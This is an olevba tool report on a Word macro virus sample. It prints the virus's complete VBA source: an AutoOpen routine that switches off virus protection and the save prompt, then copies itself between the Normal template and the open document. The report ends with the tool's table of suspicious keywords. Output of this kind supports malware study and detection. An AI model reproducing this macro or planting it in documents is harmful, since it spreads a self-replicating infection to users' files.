olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Minimal.bs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Minimal.bs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO small.bas 
in file: ./Virus.MSWord.Minimal.bs - OLE stream: 'Macros/VBA/small'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): On Error Resume Next: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: a = ActiveDocument.FullName: n = NormalTemplate.FullName
Application.OrganizerCopy Source:=a, Destination:=n, Name:="small", Object:=wdOrganizerObjectProjectItems: NormalTemplate.Save
Application.OrganizerCopy Source:=n, Destination:=a, Name:="small", Object:=wdOrganizerObjectProjectItems: ActiveDocument.Save
End Sub
'
'               MMM            MMMMMMMMM                 MM
'             MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'              MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'               MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
'                MM         MMMMMMMM               M  MMMMMMM
'                MM        MMMMMMMMM             MMM   MMMMMM
'                         MMMMMMMMMMMMMM      MMMMM    MMMMMM
'                MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'              MMMMMMMMMM                                MM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

